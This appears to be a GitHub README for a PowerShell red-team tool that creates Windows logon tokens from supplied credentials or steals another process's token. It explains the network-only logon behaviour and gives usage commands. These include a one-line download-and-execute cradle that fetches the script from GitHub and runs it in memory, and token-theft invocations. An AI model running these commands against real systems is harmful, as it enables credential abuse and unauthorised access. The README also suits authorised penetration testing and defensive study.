# Token-Impersonation
Make a Token (local admin rights not required) or Steal the Token of the specified Process ID (local admin rights required)

### Note:

The logon session created has the same local identifier as the caller. If you run commands that access local resources (like whoami), they will appear to be run under the original user context. 

This is because, locally, nothing has changed. The LUID is the same as the caller, so it appears as though you're still the original user.

However, the alternate credentials are used when accessing a remote resource.

This logon type is designed specifically for cases where you need to specify alternate credentials for outbound network connections, without affecting the local user context. 

This also means that the created token is not applicable to anything you may want to run on the current machine.

Use `Rev2Self` to drop any impersonation that may be in play.

### Load in memory
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Token-Impersonation/main/Token-Impersonation.ps1')
```

### Make a token
```
Token-Impersonation -MakeToken -Username "Administrator" -Domain "ferrari.local" -Password "P@ssw0rd!"
```

### Steal a token
```
Token-Impersonation -Steal -ProcessID 5380
```

### Rev2Self
```
Token-Impersonation -Rev2Self
```

![image](https://github.com/Leo4j/Token-Impersonation/assets/61951374/e11e3c02-19c7-4390-8322-cf459214e9e5)

![image](https://github.com/Leo4j/Token-Impersonation/assets/61951374/b4bf9c3c-aea2-4d95-bba1-73e0d36bb272)



